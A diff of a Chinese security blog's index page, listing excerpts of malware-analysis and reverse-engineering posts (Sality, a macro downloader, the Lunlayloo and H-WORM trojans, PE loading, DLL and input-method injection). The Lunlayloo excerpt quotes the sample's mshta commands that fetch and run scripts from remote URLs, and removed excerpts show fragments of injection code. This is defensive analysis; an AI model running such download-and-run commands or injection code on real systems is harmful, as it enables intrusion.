@@ -137,8 +137,206 @@
     
     
       <div class="col-12 col-md-4 m-auto">
+        <a href="/2019/12/05/简单PE加载器/" target="_self">
+          <img src="https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_a8cd741d61.jpg" srcset="/img/loading.gif" alt="简单PE加载器" class="img-fluid rounded z-depth-3 index-thumbnails">
+        </a>
+      </div>
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/12/05/简单PE加载器/">
+        <p class="h4 index-header">简单PE加载器</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">思路来源写Sality感染型病毒专杀时指令被严重混淆，通过加载PE 修改内存 跑一下解密算法效率是最高的。
+很多病毒在运行的时候都会加载另一个主映像文件去执行，而不是创建进程，就很有意思
+下面就是如何加载一个PE，再展开，最后修复执行的过程 
+该函数主要是为了将文件映射到内存中，保证源程序安全
+返回值是未展开文件在内存中的位置
+LPBYTE LoadFileToMem(LPCSTR lpFilePath)
+{
+    //////////////////////////////////////////////////////////////////////////
+    ////将源文件读到内存中                                                  ///
+    //////////////////////////////////////////////////////////////////////////
+    DWORD FileSize = 0;
+    LPBYTE Buff = NULL;
+
+    HANDLE hFil</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-05&nbsp;&nbsp;
+        
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+      <div class="col-12 col-md-4 m-auto">
+        <a href="/2019/12/02/sality样本分析/" target="_self">
+          <img src="https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_0f8723490d.jpg" srcset="/img/loading.gif" alt="Sality.ag分析" class="img-fluid rounded z-depth-3 index-thumbnails">
+        </a>
+      </div>
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/12/02/sality样本分析/">
+        <p class="h4 index-header">Sality.ag分析</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">1. sality样本分析
+
+
+sality样本分析
+基本信息
+流程图
+静态分析
+shellcode分析
+Dump出的PE
+初始化函数
+createvirusservice4053B2
+createvirusservice4053B2
+infectfile40E507
+感染各个盘的antorrun.inf文件
+感染普通文件（EXE和SCR）
+当模式为0时：
+总体感染思路
+当模式为1时：
+当模式为2时：
+
+
+感染启动项文件
+
+
+网络链接
+deletetempFile4057A0
+Peer2PeerNet403911
+
+
+IOC
+查杀方案
+清理进程
+恢复文件
+持久化文件
+
+
+总结      - [小建议](#小建议)
+
+
+
+
+
+
+1.1. 基本信息
+
+
+FileName
+FileType
+MD5
+Size
+分析时间
+
+
+
+conf.exe_
+感染型
+BC60A4BF25941088184FCEE156E2C266
+319488 bytes
+2019.11.23
+
+
+1.2. 流程图
+1.3. 静态分析程序OEP处已被修改为被混淆的跳转指令，目的就是跳转到最后一个藏好的shellcode执行</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-02&nbsp;&nbsp;
+        
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+      <div class="col-12 col-md-4 m-auto">
+        <a href="/2019/11/07/监控线程/" target="_self">
+          <img src="https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_f5f811ba9f.jpg" srcset="/img/loading.gif" alt="恶意线程清理" class="img-fluid rounded z-depth-3 index-thumbnails">
+        </a>
+      </div>
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/11/07/监控线程/">
+        <p class="h4 index-header">恶意线程清理</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">这篇博客的背景是：如果很多进程都恶意程序通过远进程注入了线程，那么应该怎么清除呢？
+下面给出两种方法
+PLAN A来自 加号
+通过遍历线程后，根据获取到的线程信息，对线程地址和入口代码进行检查，这种方式适合对注入代码偏移位置固定或则入口代码固定，能准确查杀，推荐使用
+void Killing::KillMalRemoteThread()
+{
+    (FARPROC&amp;)ZwQueryInformationThread = GetProcAddress(m_hNtdll, &quot;ZwQueryInformationThread&quot;);
+
+    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te32;
+
+    te32.dwSize = sizeof(THREADENTRY32);
+    Thread32First(hThreadSnap, &amp;te32);
+    HANDLE hThread;
+    do {
+       </div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-07&nbsp;&nbsp;
+        
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+      <div class="col-12 col-md-4 m-auto">
         <a href="/2019/10/10/宏病毒下载器/" target="_self">
-          <img src="https://w.wallhaven.cc/full/83/wallhaven-839kvo.jpg" srcset="/img/loading.gif" alt="宏病毒下载器" class="img-fluid rounded z-depth-3 index-thumbnails">
+          <img src="https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_4fc6282a45.jpg" srcset="/img/loading.gif" alt="宏病毒下载器" class="img-fluid rounded z-depth-3 index-thumbnails">
         </a>
       </div>
     
@@ -166,21 +364,10 @@ Downloader
 346112  bytes
 
 
-## 简介
-
-
-
-
-
-带有恶意宏的office文件，加载dll，下载程序执行
-
-
-
-
-
+简介带有恶意宏的office文件，加载dll，下载程序执行
 流程图
 详细分析有宏，会在你允许宏运行的时候执行起来首先会切换目录到TMPT下
-然后会调用窗体UserFrom1的Show方法,也就值展示提示窗体在展示的时候会执行UserFrom_Activate()函数，也就会调用CreatGifFile这个方法这个方法在模块 modle1中定义拼接在TEMP下的路径，根据系统位数走不同分支，我这里是win7 32位下面会拷贝本身到上面拼接好的路径 TempName中，然后复制到ZipName中会把ZipName文件按压缩包打开，取出xl\embeddings\oleObject1.bin保存到Tmp\oleObject.bin中最后会调用ReadAndWriteExtractedBinFile函数，这个函数是在oleObject.bin中找到MZ开</div>
+然后会调用窗体UserFrom1的Show方法,也就值展示提示窗体在展示的时候会执行UserFrom_Activate()函数，也就会调用CreatGifFile这个方法这个方法在模块 modle1中定义拼接在TEMP下的路径，根据系统位数走不同分支，我这里是win7 32位下面会拷贝本身到上面拼接好的路径 TempName中，然后复制到ZipName中会把ZipName文件按压缩包打开，取出xl\embeddings\oleObject1.bin保存到Tmp\oleObject.bin中最后会调用ReadAndWriteExtractedBinFile函数，这个函数是在oleObject.bin中找到MZ开头的字符区，然后读取指定字节</div>
         </div>
       </a>
 
@@ -206,7 +393,7 @@ Downloader
     
       <div class="col-12 col-md-4 m-auto">
         <a href="/2019/09/06/Lunlayloo 木马/" target="_self">
-          <img src="https://w.wallhaven.cc/full/1j/wallhaven-1j9rx1.jpg" srcset="/img/loading.gif" alt="Lunlayloo 木马" class="img-fluid rounded z-depth-3 index-thumbnails">
+          <img src="https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg" srcset="/img/loading.gif" alt="Lunlayloo 木马" class="img-fluid rounded z-depth-3 index-thumbnails">
         </a>
       </div>
     
@@ -234,21 +421,10 @@ rat
 41472 bytes
 
 
-## 简介
-
-
-
-
-
-该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。
-
-
-
-
-
+简介该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。
 流程图
 详细分析文件有宏，且宏有密码，可以使用offkey直接更改宏密码进入宏代码后在shell(fun)处下断，可以拿到shell 的连接地址 mshta http://bit.ly/8hsshjahassahsh
-打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的拿出来使用console打印出来处理后执行了WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide看看究竟是什么东西木马作者选择了一个匿名代码存放地址网站，来逃避追踪。但是目前这个RWA地址页面已经被删除了这个样本在a</div>
+打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的拿出来使用console打印出来处理后执行了WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide看看究竟是什么东西木马作者选择了一个匿名代码存放地址网站，来逃避追踪。但是目前这个RWA地址页面已经被删除了这个样本在any.run上有人运行过，有</div>
         </div>
       </a>
 
@@ -277,7 +453,7 @@ rat
     
       <div class="col-12 col-md-4 m-auto">
         <a href="/2019/09/05/ida查找检测虚拟机代码/" target="_self">
-          <img src="https://w.wallhaven.cc/full/0p/wallhaven-0ppglp.jpg" srcset="/img/loading.gif" alt="IDA 查找检测虚拟机代码" class="img-fluid rounded z-depth-3 index-thumbnails">
+          <img src="https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_dd81742271.jpg" srcset="/img/loading.gif" alt="IDA 查找检测虚拟机代码" class="img-fluid rounded z-depth-3 index-thumbnails">
         </a>
       </div>
     
@@ -318,67 +494,6 @@ vbox_check =</div>
           <i class="iconfont icon-tag"></i>
           
             <a href="/tags/IDA">IDA</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/09/04/H-WORM变种远控分析/" target="_self">
-          <img src="https://w.wallhaven.cc/full/96/wallhaven-96zg71.jpg" srcset="/img/loading.gif" alt="H-WORM变种远控分析" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/09/04/H-WORM变种远控分析/">
-        <p class="h4 index-header">H-WORM变种远控分析</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">基本信息
-
-
-FileName
-FileType
-MD5
-Size
-
-
-
-4gdrwceq60b7dbl.sct
-rat
-69B7D326575C5616D82645960B3D081A
-403845 bytes
-
-
-简介该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。
-流程图
-详细分析这个样本母体总共会释放3个脚本
-脚本1首先我们看看4gdrwceq60b7dbl.sct，这个样本的母体，是一个sct格式的文件这是Visual FoxPro的表单配置文件我们用Sublimi Text来打开它，记事本也是可以的。
-利用组数来存关键字符串，通过字符串的拼接来合成完整路径会尝试删除%APPDATA%\\taskmgr.js  这个文件文件中有很长一段密文，这里我改名为了EncodeList，通过System.IO.MemoryStream.WriteByte()方法把数据读入数据流中。最重要的是使用ADODB.Stream类方法把这个数据流保存到了被上面删除掉的%APPDATA%\\taskmgr.js文件中最后使用WScript.S</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-04&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90">样本详细分析</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/Rat%20H-worm">Rat H-worm</a>&nbsp;
           
         
       </div>
@@ -449,8 +564,69 @@ void useCom()
     
     
       <div class="col-12 col-md-4 m-auto">
+        <a href="/2019/09/04/H-WORM变种远控分析/" target="_self">
+          <img src="https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_4c746d4df0.jpg" srcset="/img/loading.gif" alt="H-WORM变种远控分析" class="img-fluid rounded z-depth-3 index-thumbnails">
+        </a>
+      </div>
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/04/H-WORM变种远控分析/">
+        <p class="h4 index-header">H-WORM变种远控分析</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">基本信息
+
+
+FileName
+FileType
+MD5
+Size
+
+
+
+4gdrwceq60b7dbl.sct
+rat
+69B7D326575C5616D82645960B3D081A
+403845 bytes
+
+
+简介该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。
+流程图
+详细分析这个样本母体总共会释放3个脚本
+脚本1首先我们看看4gdrwceq60b7dbl.sct，这个样本的母体，是一个sct格式的文件这是Visual FoxPro的表单配置文件我们用Sublimi Text来打开它，记事本也是可以的。
+利用组数来存关键字符串，通过字符串的拼接来合成完整路径会尝试删除%APPDATA%\\taskmgr.js  这个文件文件中有很长一段密文，这里我改名为了EncodeList，通过System.IO.MemoryStream.WriteByte()方法把数据读入数据流中。最重要的是使用ADODB.Stream类方法把这个数据流保存到了被上面删除掉的%APPDATA%\\taskmgr.js文件中最后使用WScript.S</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-04&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90">样本详细分析</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/Rat%20H-worm">Rat H-worm</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+      <div class="col-12 col-md-4 m-auto">
         <a href="/2019/09/03/替换特权指令 提升权限/" target="_self">
-          <img src="https://w.wallhaven.cc/full/x1/wallhaven-x1v3lo.png" srcset="/img/loading.gif" alt="替换特权指令 提升权限" class="img-fluid rounded z-depth-3 index-thumbnails">
+          <img src="https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_aab63e9f07.jpg" srcset="/img/loading.gif" alt="替换特权指令 提升权限" class="img-fluid rounded z-depth-3 index-thumbnails">
         </a>
       </div>
     
@@ -507,7 +683,7 @@ void CgPivilige()
     
       <div class="col-12 col-md-4 m-auto">
         <a href="/2019/09/02/利用弱口令传播横向的远控组件/" target="_self">
-          <img src="https://w.wallhaven.cc/full/13/wallhaven-1312wv.jpg" srcset="/img/loading.gif" alt="弱口令横向传播" class="img-fluid rounded z-depth-3 index-thumbnails">
+          <img src="https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_06ce32b998.jpg" srcset="/img/loading.gif" alt="弱口令横向传播" class="img-fluid rounded z-depth-3 index-thumbnails">
         </a>
       </div>
     
@@ -559,177 +735,6 @@ rat
           <i class="iconfont icon-tag"></i>
           
             <a href="/tags/malware%20Rat">malware Rat</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/08/26/输入法注入/" target="_self">
-          <img src="https://w.wallhaven.cc/full/5d/wallhaven-5dxmj9.jpg" srcset="/img/loading.gif" alt="输入法注入" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/08/26/输入法注入/">
-        <p class="h4 index-header">输入法注入</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">特性因为输入法的本身特性，能注入任何一个程序，还可以开机启动，很是友好
-网上大都是一个版本方法，我记录下我自己过程
-思路1.编写一个正常的输入法2.将它安装到电脑上，并设置为默认输入法，这样就可以在程序打开的时候就调用它的处理函数
-因为输入是一个特殊的dll，本质就是一个dll，只是后最不同而已。
-一个最简ime文件都必须两个函数
-一个dllmain() 还有一个ImeInquire()这两个是必须的
-编写输入法主要文件创建一个dll项目,解释都在注释中（注意项目为多字节字符集）dllmain.cpp
-#include &quot;stdafx.h&quot;
-#include &quot;windows.h&quot;
-#include &quot;imm.h&quot;
-#include &quot;immdev.h&quot;
-#pragma comment(lib,&quot;imm32.lib&quot;)
-
-LPCSTR injectDllPaht = &quot;C://expDll.dll&quot;; //我们最终利用的Dll，写入自己的功能
-void injectD</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-26&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/%E6%B3%A8%E5%85%A5">注入</a>&nbsp;
-          
-            <a href="/tags/%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8">开机启动</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/08/26/远线程注入/" target="_self">
-          <img src="https://w.wallhaven.cc/full/q6/wallhaven-q6g5zl.jpg" srcset="/img/loading.gif" alt="远线程注入" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/08/26/远线程注入/">
-        <p class="h4 index-header">远线程注入</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">什么是远线程注入在一个进程中，调用CreateThread或CreateRemoteThreadEx函数，在另一个进程内创建一个线程（因为不在同一个进程中，所以叫做远程线程）。创建的线程一般为Windows API函数LoadLibrary，来加载一个动态链接库(DLL)，从而达到在另一个进程中运行自己所希望运行的代码的目的。
-代码下面例子是根据查询一打开窗口中的计算器进程，然后注释都很详细 
-#include &quot;windows.h&quot;
-#include &quot;Tlhelp32.h&quot;
-int InjectDll(DWORD dwProcessId, PTCHAR szDllName);
-int EnablePrivilege(bool isStart);
-DWORD GetProcessId(PTCHAR pszProcessName);
-
-void main()
-{
-    DWORD ProcessId = GetProcessId(&quot;calc.exe&quot;);\\目标程序
-    InjectDll(ProcessId ,&quo</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-26&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/%E6%B3%A8%E5%85%A5">注入</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/08/26/SEH创建与查找/" target="_self">
-          <img src="https://w.wallhaven.cc/full/5d/wallhaven-5d2p17.jpg" srcset="/img/loading.gif" alt="SEH创建与查找" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/08/26/SEH创建与查找/">
-        <p class="h4 index-header">SEH创建与查找</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">创建一个SEH处理函数
-#include &quot;stdafx.h&quot;
-#define WIN32_LEAN_AND_MEAN
-#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-#include &quot;stdlib.h&quot;
-
-DWORD scratch;
-
-EXCEPTION_DISPOSITION exceptHandler(struct _EXCEPTION_RECORD *ExceptionRecord,
-                        void * EstablisherFrame,
-                        struct _CONTEXT *ContextRecord,
-                        void * DispatcherContext)
-{
-
-    unsigned i;
-
-    MessageBox(0,_T(&quot;i am in except!!!&quot;),0,0);
-
-    ContextRecord-&</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-26&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/SEH">SEH</a>&nbsp;
-          
-            <a href="/tags/Windbg">Windbg</a>&nbsp;
           
         
       </div>
